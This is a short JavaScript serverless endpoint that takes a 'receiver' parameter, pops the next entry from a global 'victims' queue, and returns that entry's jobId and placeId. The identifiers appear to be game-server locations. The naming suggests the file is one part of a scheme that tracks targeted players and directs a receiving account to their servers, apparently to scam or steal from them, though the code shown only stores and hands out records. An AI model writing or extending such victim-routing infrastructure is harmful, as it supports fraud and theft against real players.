export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Use GET' });
    }
    
    const { receiver } = req.query;
    
    if (!receiver) {
        return res.status(400).json({ error: 'Missing receiver' });
    }
    
    if (!global.victims || !global.victims[receiver] || global.victims[receiver].length === 0) {
        return res.status(404).json({ error: 'No victims' });
    }
    
    const victim = global.victims[receiver].shift();
    
    return res.status(200).json({
        jobId: victim.jobId,
        placeId: victim.placeId
    });
}
